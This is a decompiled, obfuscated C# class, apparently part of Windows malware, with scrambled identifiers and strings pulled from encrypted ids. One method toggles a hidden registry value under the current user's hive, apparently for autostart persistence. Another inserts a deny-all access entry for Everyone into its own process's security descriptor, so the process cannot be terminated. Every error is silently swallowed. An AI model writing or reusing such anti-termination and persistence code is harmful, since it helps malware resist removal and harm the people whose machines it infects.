using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace HuHbCLeSgdQqCa;

internal sealed class AwnrAEXPGRgsG
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr WeZcCoeffHpNIu, int uXodcOUREynbDuo, [Out] byte[] XLySmhfQmoO, uint nhUaeoLybhc, out uint psIMxSgfYbB);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr KaPNKlTgubrAPS, int nnxhRtcwKj, [In] byte[] kvjBwYAFeSFkjPrl);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void cgYiOCsKyYwZ(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(getString_0(107411750));
			if (bool_0 && registryKey.GetValue(getString_0(107411641)) != null)
			{
				registryKey.DeleteValue(getString_0(107411641));
			}
			else
			{
				registryKey.SetValue(getString_0(107411641), getString_0(107412088));
			}
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor wQDaAKyzZqvJgOY(IntPtr intptr_0)
	{
		byte[] xLySmhfQmoO = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, xLySmhfQmoO, 0u, out var psIMxSgfYbB);
		if ((long)psIMxSgfYbB > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, xLySmhfQmoO = new byte[psIMxSgfYbB], psIMxSgfYbB, out psIMxSgfYbB))
		{
			return null;
		}
		return new RawSecurityDescriptor(xLySmhfQmoO, 0);
	}

	private void fjjtOTfgOpt(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void nVbbGLOxlhbeKxP()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = wQDaAKyzZqvJgOY(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			fjjtOTfgOpt(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static AwnrAEXPGRgsG()
	{
		Strings.CreateGetStringDelegate(typeof(AwnrAEXPGRgsG));
	}
}
